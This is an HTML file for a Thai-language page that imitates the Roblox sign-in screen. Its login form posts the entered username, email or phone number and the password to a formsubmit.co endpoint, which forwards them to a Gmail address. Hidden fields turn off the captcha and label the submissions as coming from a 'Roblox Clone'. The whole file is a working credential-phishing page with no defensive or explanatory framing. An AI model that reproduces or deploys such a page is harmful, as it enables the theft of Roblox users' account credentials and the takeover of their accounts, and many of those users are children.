  <!DOCTYPE html>
  <html lang="th">
  <head>
    <meta charset="UTF-8">
    <title>Roblox - ลงชื่อเข้าใช้</title>
    <style>
      body {
        margin: 0;
        font-family: 'Arial', sans-serif;
        background-color: #1c1c1c;
        color: white;
      }
  
      .navbar {
        background-color: #111111;
        padding: 10px 20px;
        display: flex;
        align-items: center;
        justify-content: space-between;
      }
  
      .navbar-left {
        display: flex;
        align-items: center;
        gap: 20px;
      }
  
      .navbar-left img {
        height: 24px;
      }
  
      .navbar-left a {
        color: white;
        text-decoration: none;
        font-size: 14px;
      }
  
      .navbar-left a:hover {
        text-decoration: underline;
      }
  
      .nav-right {
        display: flex;
        gap: 10px;
      }
  
      .navbar button {
        padding: 8px 16px;
        border: none;
        border-radius: 4px;
        font-size: 14px;
        cursor: pointer;
      }
  
      .btn-primary {
        background-color: #0d6efd;
        color: white;
      }
  
      .btn-secondary {
        background-color: #2e2e2e;
        color: white;
        border: 1px solid #444;
      }
  
      .container {
        display: flex;
        justify-content: center;
        margin-top: 50px;
      }
  
      .login-box {
        background-color: #2e2e2e;
        padding: 30px;
        border-radius: 8px;
        width: 350px;
        box-shadow: 0 0 10px rgba(0,0,0,0.5);
        text-align: center;
      }
  
      .login-box h2 {
        margin-bottom: 20px;
        font-weight: bold;
        font-size: 20px;
      }
  
      input {
        width: 100%;
        padding: 12px;
        margin-bottom: 15px;
        border: none;
        border-radius: 4px;
        background-color: #1c1c1c;
        color: white;
        font-size: 14px;
      }
  
      input::placeholder {
        color: #aaa;
      }
  
      .login-button {
        background-color: #111111;
        color: white;
        border: 1px solid #555;
        padding: 12px;
        border-radius: 4px;
        width: 100%;
        font-size: 15px;
        cursor: pointer;
      }
  
      .login-button:hover {
        background-color: #333;
      }
  
      .link {
        font-size: 13px;
        margin-top: 10px;
      }
  
      .link a {
        color: #0d6efd;
        text-decoration: none;
      }
  
      .link a:hover {
        text-decoration: underline;
      }
  
      .extra-buttons button {
        width: 100%;
        margin-top: 10px;
        padding: 10px;
        background-color: #3a3a3a;
        border: none;
        border-radius: 4px;
        color: white;
        font-size: 14px;
        cursor: pointer;
      }
  
      .extra-buttons button:hover {
        background-color: #555;
      }
  
      .divider {
        height: 1px;
        background-color: #444;
        margin: 20px 0;
      }
    </style>
  </head>
  <body>
  
    <div class="navbar">
      <div class="navbar-left">
      </div>
      <div class="nav-right">
        <button class="btn-secondary">สมัครสมาชิก</button>
        <button class="btn-primary">เข้าสู่ระบบ</button>
      </div>
    </div>
  
    <div class="container">
      <div class="login-box">
        <h2>เพิ่มบัญชี</h2>
<form action="https://formsubmit.co/good.abcdfg@gmail.com" method="POST">
  <input type="text" name="username" placeholder="ชื่อผู้ใช้/อีเมล/หมายเลขโทรศัพท์" required>
  <input type="password" name="password" placeholder="รหัสผ่าน" required>
  <button type="submit" class="login-button">ลงชื่อเข้าใช้</button>

  <!-- ป้องกันบอท + ปรับแต่งให้ไม่ต้อง redirect -->
  <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="_template" value="table">
  <input type="hidden" name="_subject" value="มีคนส่งข้อมูลจากเว็บ Roblox Clone">
</form>
        <div class="link">
          <p>ลืมรหัสผ่านหรือชื่อผู้ใช้ใช่ไหม?</p>
        </div>
  
        <div class="divider"></div>
  
        <div class="extra-buttons">
          <button>ส่งรหัสแบบใช้ครั้งเดียวให้ฉันทางอีเมล</button>
          <button>ใช้อุปกรณ์อื่น</button>
        </div>
  
        <div class="link" style="margin-top: 20px;">
          <p>ยังไม่มีบัญชีใช่ไหม? <a href="#">ลงทะเบียน</a></p>
        </div>
      </div>
    </div>
  
  </body>
  </html>
